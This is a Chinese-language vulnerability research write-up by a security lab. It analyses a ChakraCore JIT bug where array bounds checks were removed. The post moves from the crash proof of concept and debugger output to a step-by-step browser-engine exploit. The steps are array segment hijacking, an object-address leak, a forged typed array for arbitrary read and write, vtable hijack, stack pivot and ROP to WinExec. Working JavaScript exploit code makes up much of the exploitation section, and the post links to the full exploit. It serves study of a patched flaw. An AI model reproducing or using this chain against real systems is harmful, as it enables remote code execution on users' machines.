本文作者：逐日实验室，寓意为追逐技术永不停歇，是默安科技安全研究院下的一支团队。

对于浏览器，PDF类软件漏洞，JavaScript脚本都是利用的主要载体，因此这些漏洞的分析利用对js语言的理解也有一定要求。由于笔者对js的涉猎较浅，编写exp的过程中涉及js特性的知识大多靠现查现学，因此会尽量避免下出不够确定的结论，若还有欠缺或谬误的地方也请师傅们指正。

## **0x01 前期工作**

首先clone并切换到漏洞所在的源码版本

    
    
    git clone https://github.com/microsoft/ChakraCore.git
    git checkout d8ef97d90c231e83db96dc4fdff4b39409f7a9b6

Chakra.Core.sln文件在Build目录下。推荐使用VS2015生成解决方案，新版VS可能会遇到缺少运行库的问题。

本文分析仅针对Release配置下编译生成的Chakra，Debug配置中会启用一些额外的检测。

## **0x02 Crash &POC分析**

使用VS或者Windbg调试都可以，设置可执行文件为ch.exe，参数为js文件。

    
    
    function write(begin,end,step,num)
    {
     for(var i=begin;i<end;i+=step) view[i]=num;
    }
    var buffer =  new ArrayBuffer(0x10000);
    var view   =  new Uint32Array(buffer);
    write(0,0x4000,1,0x1234);
    write(0x3000000e,0x40000010,0x10000,1851880825);

`首先对POC内容简单分析一下`

  * buffer申请了一块0x10000的内存作为缓冲区

  * view是以buffer为缓冲区的Uint32变量类型的数组

  * 自定义的write函数对view数组进行了一个循环赋值的操作

  * 第二次write显然超出了0x10000缓冲区的范围，但js中的数组越界赋值，通常会直接忽略

但是Windbg捕获到了一个异常：

    
    
    (7200.6cbc): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    000001a2`9fad0157 46892c8e        mov     dword ptr [rsi+r9*4],r13d ds:000001a2`644c0038=????????

观察相关寄存器及其指向内存区域的情况，其详细内容如下：

    
    
    0:004> r @rsi,@r9
    rsi=000001a19fa40000 r9=00000000312a000e
    
    
    0:004> dd @rsi
    000001a1`9fa40000  00001234 00001234 00001234 00001234
    000001a1`9fa40010  00001234 00001234 00001234 00001234
    000001a1`9fa40020  00001234 00001234 00001234 00001234
    000001a1`9fa40030  00001234 00001234 00001234 00001234
    000001a1`9fa40040  00001234 00001234 00001234 00001234
    000001a1`9fa40050  00001234 00001234 00001234 00001234
    000001a1`9fa40060  00001234 00001234 00001234 00001234
    000001a1`9fa40070  00001234 00001234 00001234 00001234

显然rsi指向buffer，r9是write中进行的数组赋值操作中的数组下标i,乘以4是因为Uint32成员单位大小是4字节

    
    
    0:004> dd @rsi+@r9*4
    000001a2`64500038  ???????? ???????? ???????? ????????
    000001a2`64500048  ???????? ???????? ???????? ????????
    000001a2`64500058  ???????? ???????? ???????? ????????
    000001a2`64500068  ???????? ???????? ???????? ????????
    000001a2`64500078  ???????? ???????? ???????? ????????
    000001a2`64500088  ???????? ???????? ???????? ????????
    000001a2`64500098  ???????? ???????? ???????? ????????
    000001a2`645000a8  ???????? ???????? ???????? ????????
    0:004> !address @rsi+@r9*4
    
    Usage:                  <unknown>
    Base Address:           000001a1`9fa50000
    End Address:            000001a2`9fa40000
    Region Size:            00000000`ffff0000 (   4.000 GB)
    State:                  00002000          MEM_RESERVE
    Protect:                <info not present at the target>
    Type:                   00020000          MEM_PRIVATE
    Allocation Base:        000001a1`9fa40000
    Allocation Protect:     00000001          PAGE_NOACCESS

`越界后的数组下标指向的这块内存不具有RW权限，因此产生了异常`

> 关注点：R9的值并不是第一次越界写入时的数组下标，并且JS正常情况下数组越界并不应该产生异常

查看异常发生时的调用栈

![](https://image.3001.net/images/20200814/1597376811.png!small)

由此可得，是for循环达到一定次数后触发了JIT机制，而异常就发生在通过JIT编译后执行的越界写入中。显然此处JIT生成的汇编代码缺少数组下标的越界检测，通过patch代码的分析来探寻其中的原因。

![](https://image.3001.net/images/20200814/1597376812.png!small)

patch的内容：针对三个标志位的设置与否，添加了额外的检测

> **根据eliminatedLowerBoundCheck** 与 **eliminatedUpper-BoundCheck**
> 意译可知，是关闭下标溢出检测的标志位，由此可得这个漏洞之所以能轻易数组越界，是因为开发者主动关闭下标检测。而相关原因将在下文进一步分析。

此外，这个漏洞还有一个特点，JIT中数组越界产生的异常会被chakra自己处理，并不会引发crash，理论上这对漏洞利用的稳定性会有所帮助。（但最后写出的Exp其实并没有用上这个机制）

## **0x03 成因分析**

POC中ArrayBuffer申请的长度0x10000并不是随便选的，这个长度将会决定是由AllocWrapper还是malloc申请内存

    
    
    JavascriptArrayBuffer::JavascriptArrayBuffer(uint32 length, DynamicType * type) :
        ArrayBuffer(length, type, (IsValidVirtualBufferLength(length)) ? AllocWrapper : malloc)
    {
    }
    
    
    bool JavascriptArrayBuffer::IsValidVirtualBufferLength(uint length)
    {
    
    #if _WIN64
            /*
            1. length >= 2^16
            2. length is power of 2 or (length > 2^24 and length is multiple of 2^24)
            3. length is a multiple of 4K
            */
            return (!PHASE_OFF1(Js::TypedArrayVirtualPhase) &&
                (length >= 0x10000) &&
                (((length & (~length + 1)) == length) ||
                (length >= 0x1000000 &&
                ((length & 0xFFFFFF) == 0)
                )
                ) &&
                ((length % AutoSystemInfo::PageSize) == 0)
                );
    #else
            return false;
    #endif
     }

> 由上方可知0x10000是满足调用AllocWrapper的最小长度

再来看看AllocWrapper的逻辑，实际上还是使用VirtualAlloc进行内存申请与管理：

    
    
    static void*__cdecl  AllocWrapper(DECLSPEC_GUARD_OVERFLOW size_t length)
    {
    #if _WIN64
                LPVOID address = VirtualAlloc(nullptr, MAX_ASMJS_ARRAYBUFFER_LENGTH, MEM_RESERVE, PAGE_NOACCESS);
                //throw out of memory
                if (!address)
                {
                    Js::Throw::OutOfMemory();
                }
                LPVOID arrayAddress = VirtualAlloc(address, length, MEM_COMMIT, PAGE_READWRITE);
                if (!arrayAddress)
                {
                    VirtualFree(address, 0, MEM_RELEASE);
                    Js::Throw::OutOfMemory();
                }
                return arrayAddress;
    #else
                Assert(false);
                return nullptr;
    #endif
    }

其中VirtualAlloc申请的大小 **MAX_ASMJS_ARRAYBUFF-ER_LENGTH** 是固定值，直接一次性申请4GB大小

    
    
    define MAX_ASMJS_ARRAYBUFFER_LENGTH 0x100000000 //4GB

>
> AllocWrapper中调用了两次VirtualAlloc，第一次申请了0x100000000的巨大空间但是设置为NOACCESS，第二次VirtualAlloc根据ArrayBuffer实际申请的长度，把0x10000000中相应长度的区域设置为RW

这下我们就可以尝试解释JIT中忽略异常并不设置下标检测的原因了：

  * 这块4G的缓冲区中仅会作为一个数组对象的缓冲区

  * chakra中数组下标是uint32类型，因此其最大值是2^32-1

  * 假设数组成员变量是单字节大小，那刚好无法越过4G的范围

  * 在4G的范围内进行越界读写，并不会产生危害

  * 关闭下标检测可以提升性能

但POC中已经给出了答案，若数组成员变量大于1字节，则可以跨越4G的安全区去进行越界读写。只要利用堆喷射等方式申请到4G的正后方内存，就可以劫持对象的数据结构从而间接实现任意读写。

## **0x04 漏洞利用**

windows环境下的利用相比linux会复杂一些，首要目标大多是先尝试达成任意地址读写，再往后一般也就只是时间问题了。

### **数据对象劫持**

首先观察一下与后续利用相关的数据结构：

    
    
    //arr大概率能分配到buffer申请到的4G空间的正后方
    var buffer =  new ArrayBuffer(0x10000);
    var view   =  new Uint32Array(buffer);
    var arr = new Array(0x800)
    arr[0]=0x111
    arr[1]=0x222

  * chakra中数组是基于B Tree的数据结构，大体上我们需要了解其是将数组分部在多节点内存存储

  * 每个节点称之为segment，其中length代表已存储的成员数量，size代表这个seg的大小

  * left代表B tree中左节点

  * next指向下一个segment

  * 0x80000002是MissingItem，简单可以理解为未初始化时的默认值。

  * segment中head的偏移是0x20，存放数组成员的地方从0x38偏移处开始；next指向的是下个segment.head

    
    
    0:004> dd 1D7`CE5A0000
    000001d7`ce5a0000  00000000 00000000 00002020 00000000
    000001d7`ce5a0010  00000000 00000000 0000b33a 00000000
    000001d7`ce5a0020  00000000 00000002 00000802 00000000
    000001d7`ce5a0030  00000000 00000000 00000111 00000222
    000001d7`ce5a0040  80000002 80000002 80000002 80000002

`![](https://image.3001.net/images/20200814/1597376814.png!small)`

> 使用vs调试可以更轻松地观察数据结构
    
    
    //通过以下代码进一步观察left与next
    arr[0]=0x111
    arr[1]=0x222
    arr[0x2000]=112233
    arr[0x4000]=334455
    
    
    0x00000131C3B24520  00000000 00000000 00000000 00000000
    0x00000131C3B24530  00000000 00000000 00000000 00000000
    0x00000131C3B24540  00000000 00000002 00000012 00000000  //left=0 size=2 length=0x12
    0x00000131C3B24550  c3b245a0 00000131 00000111 00000222  //next=0x131c3b245a0
    0x00000131C3B24560  80000002 80000002 80000002 80000002
    .....
    0x00000131C3B245A0  00002000 00000001 00000012 00000000  //left=0x2000 size=1 length=0x12
    0x00000131C3B245B0  c2158180 00000129 00000333 80000002  //next=0x129c2158180
    0x00000131C3B245C0  80000002 80000002 80000002 80000002
    ......
    0x00000129C2158180  00004000 00000001 00000012 00000000  //left=0x4000
    0x00000129C2158190  00000000 00000000 00000444 80000002
    0x00000129C21581A0  80000002 80000002 80000002 80000002

进行数组查询时，会根据length与size判断是否要去next的下一个节点，如果我们通过POC中的越界写入修改了length与size并改得很大，那就可以通过该数组进行越界读写。

EXP Step1：成功分配两个数组的buffer到4G空间后方

` `

    
    
    var buffer = new ArrayBuffer(0x10000);
    var view = new Uint32Array(buffer);
    var arr1 = new Array(0x800);
    var arr2 = new Array(0x800);

` `

> 通过调试观察可得arr2因为内存对齐，实际位于arr1+0x3000处，中间存在无效数据

` `

    
    
    0:009> dd 0x1AE5EBE0000
    000001ae`5ebe0000  00000000 00000000 00002020 00000000
    000001ae`5ebe0010  00000000 00000000 000066af 00000000
    000001ae`5ebe0020  00000000 000f0000 000f0000 00000000
    000001ae`5ebe0030  00000000 00000000 12345678 0000aaaa
    000001ae`5ebe0040  00000000 80000002 80000002 80000002
    000001ae`5ebe0050  80000002 80000002 80000002 80000002
    0:009> dd 0x1AE5EBE3000
    000001ae`5ebe3000  00000000 00000000 00004020 00000000
    000001ae`5ebe3010  00000000 00000000 0000468f 00000000
    000001ae`5ebe3020  00000000 00000004 00000801 00000000
    000001ae`5ebe3030  00000000 00000000 00000123 00010000

` `

### **任意对象地址泄漏**

    
    
    myarr[0]=myobj;

这一步实际上是将myobj的地址作为指针存储在了数组中，不过正常情况下无法将这个指针的值直接leak出来，但利用越界读等特殊方式就可以做到。

> EXP Step2：利用arr1越界读取arr2中的对象指针，实现任意对象leak
    
    
    //JIT OOB hijack length and size of arr1
    write(0x40000000+0x09,0x40000000+0x001000,0x100000,0xf0000);
    //Now arr1 can OOB read&write arr2
    write(0x40000000+0x0a,0x40000000+0x001000,0x100000,0xf0000);
    
    //now you can leak any object
    function getobjadd(myobj)
    {
      arr2[3]=myobj;
      uint32[0]=arr1[0xc06];//int to uint
      return (arr1[0xc07])*0x100000000+uint32[0];
    }

### **通过伪造对象实现任意地址读写**

这是利用过程中最复杂的操作。

首先总结一下目前拥有的能力：

  1. 通过JIT漏洞越界写arr1及其高地址的内容

  2. 通过arr1越界读写高于arr1地址的内容，如arr2

  3. 任意对象地址leak

而我们现在想伪造一个array对象，通过控制其buffer的方式来实现任意读写，并且buffer以外的对象数据也必须设置得合法。显然目前所拥有的能力很有限，但是上文提到的seg.next在此刻派上了大用场。

> 将segment的next劫持为对象地址，访问超出当前segment left+length的成员时，则会将该对象的地址当作下一个segment访问
    
    
    //申请四个共用buffer1缓冲的数组
    var buffer1 = new ArrayBuffer(0x100);
    //view1-4对象本身基本会分配在一块连续内存上
    var view1 = new Uint32Array(buffer1);
    var view2 = new Uint32Array(buffer1);
    var view3 = new Uint32Array(buffer1);
    var view4 = new Uint32Array(buffer1);

调试观察可得，view对象大小为0x40字节

    
    
    00000230`09013940  00007FFB6B9F8D78 0000023008FD5480 //view1 0偏移处为指向虚表的指针
    00000230`09013950  0000000000000000 0000000000000000
    00000230`09013960  0000000000000040 0000023009030190  //指向buffer1对象
    00000230`09013970  0000000000000004 00000228075AE5F0  //指向真正的缓冲区
    00000230`09013980  00007FFB6B9F8D78 0000023008FD5480  //view2
    00000230`09013990  0000000000000000 0000000000000000
    00000230`090139A0  0000000000000040 0000023009030190
    00000230`090139B0  0000000000000004 00000228075AE5F0
    00000230`090139C0  00007FFB6B9F8D78 0000023008FD5480  //view3
    00000230`090139D0  0000000000000000 0000000000000000
    00000230`090139E0  0000000000000040 0000023009030190
    00000230`090139F0  0000000000000004 00000228075AE5F0

  1. 上文指出，next指向的是head，而head与数组成员间还相隔0x38-0x20=0x18

  2. 要想通过伪造的next越界读写，必须要知道fake head.left来确定数组下标index

  3. 0x28偏移处是指向buffer1对象的指针，可以通过任意对象leak来获取

综上，将next设置为view1+0x28，则left就是buffer1地址的低4字节，并且数组成员起始区域是view1+0x28+0x18，刚好是view2对象的地址

    
    
    //将对象数据复制到buffer1缓冲区中
    uint32[0]=arr1[0xc00];//leak low 4Byte of buffer1 and int to uint
    index=uint32[0];
    for(var i=0;i<0x10;i++) {
      view4[i]=arr1[index+i];//Copy data of view object for faking
    }

> Tips：
>
>   1. arrint当前是int32类型数组，因此数据若大于0x7fffffff，应先转为负数再传给arrint
>
>   2. arrint本身有length属性，必须大于访问的index，直接设置为0xffffff00即可
>
>

现在buffer1中已经有了一个完整且合法的数组对象，通过view1[0xe&0xf]即可修改fake buffer来实现任意读写。

最后的一步就是让解释器也把这块内存上的数据当作对象处理

> EXP Step3：任意地址读写
>
>   * 关于如何让chakra将指针认为是对象，暂未能深入探究，仅通过不断修改代码测试得出可行的方法
>   *
> 由于笔者能力有限，本文对chakra数组实现的分析仅深入到能理解Exp利用方式的程度，关注点在于left，size，length，next这四个变量的作用。
>

` `

    
    
    function readuint32(address)
    {
      view4[0x0e]=address%0x100000000;
      view4[0x0f]=address/0x100000000;
      return myview[0];
    }
    
    function writeuint32(address,num)
    {
      view4[0x0e]=address%0x100000000;
      view4[0x0f]=address/0x100000000;
      myview[0]=num;
    }

` `

## **0x05 从任意读写到弹计算器**

### **劫持控制流**

常规思路有泄露栈地址然后ROP等，但windows下的栈稳定性不像linux，即使泄露stack
base也难以确认返回地址所在的位置，此处选择的方法是虚表劫持。上文提到view对象0偏移处即为该类数组对象的虚表，类似于linux
pwn中常见的IO_FILE利用中可劫持的vtable

    
    
    00007FFB`87818D78  00007FFB87213CE0 00007FFB87213CE0   //都是函数指针
    00007FFB`87818D88  00007FFB87213CE0 00007FFB87213CE0
    00007FFB`87818D98  00007FFB87213D10 00007FFB87557480
    00007FFB`87818DA8  00007FFB87557460 00007FFB875574A0
    00007FFB`87818DB8  00007FFB87557420 00007FFB874BF350
    00007FFB`87818DC8  00007FFB873B8310 00007FFB87557DF0

因此我们只要将view对象的虚表指针修改到我们可控的区域，就可以劫持控制流了

### **栈迁移**

由于windows下并没有one_gadget这种方便的存在，劫持控制流后还需要结合其他利用技术才能进行下一步，寻找合适的gadget往往也会是个不小的难题。

>   * 本机环境的ntdll与kernel32.dll中，能直接控制RSP并且ret的只有mov rsp， r11。通过push rxx；pop
> rsp这种间接控制的gadget笔者也没有找到，因此思路转向寻找会使r11数值可控的数组方法
>
>   * 经过很多次尝试后，发现 **arr1==arr2** 会将r11设置为arr2对象地址
>
>

因此可以直接将对象区域破坏，用于存放ROP chain

### **泄漏模块地址**

> windows有个特性，短时间内模块的基址是不会变的，利用这点可以让调试过程更加方便

  1. 通过对象的虚表指针，减去偏移可以得到ChakraCore.dll的基址

  2. 通过ChakraCore.dll的IAT表，leak其他模块基址

### **ROP**

  * windows中的底层api往往需要很多参数，大多不像linux下的system/execve那么好用，而且还散布在不同的dll中。此处推荐kernel32!WinExec，仅需控制两个参数并且位于kernel32模块，非常方便。

  * windows64位下api使用寄存器传参通过RCX, RDX, R8, R9，RSP+0x20....传递

  * ntdll中一般会存在很多好用的gadget用于控制参数寄存器

## **0x06 利用效果**

>   * 本地环境测试中，唯一的不稳定因素是arr1能否占位到4GB后，成功率大约有80-90%
>
>   * 尝试在开头就大量new
> Array来占位4GB后，经测试绝大多数情况都是第一次分配就占位成功，若不成功则后续也难以占位到这处位置。若要达成100%成功率，需在此处进一步研究。
>
>   * 其他环境复现，需要修改ROP中用到的gadget偏移
>
>

![](https://image.3001.net/images/20200814/1597376815.gif!small)实际上要在Edge上成功利用的话，还需要绕过CFG机制，也就是说无法通过劫持虚表指针直接ROP。至于如何绕过CFG机制的保护，还需要进一步深入的学习。

P.S.
完整exp与注释已经开源至逐日实验室的Github仓库！点击[这里](https://github.com/ZhuriLab/Exploits%20)跳转或复制以下地址：<https://github.com/ZhuriLab/Exploits>

**![](https://image.3001.net/images/20200814/1597375662.jpg!small)**

## **0x07 参考链接**

Pwn2Own 2017 再现上帝之手：https://slab.qq.com/news/tech/1572.html

case study:
cve-2017-0234：https://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/

_

默安科技逐日实验室专注于信息安全攻防研究，包括漏洞挖掘、逆向工程、红蓝对抗、代码审计、产品赋能等方向，
转载请注明来自[FreeBuf.COM](https://www.freebuf.com/)

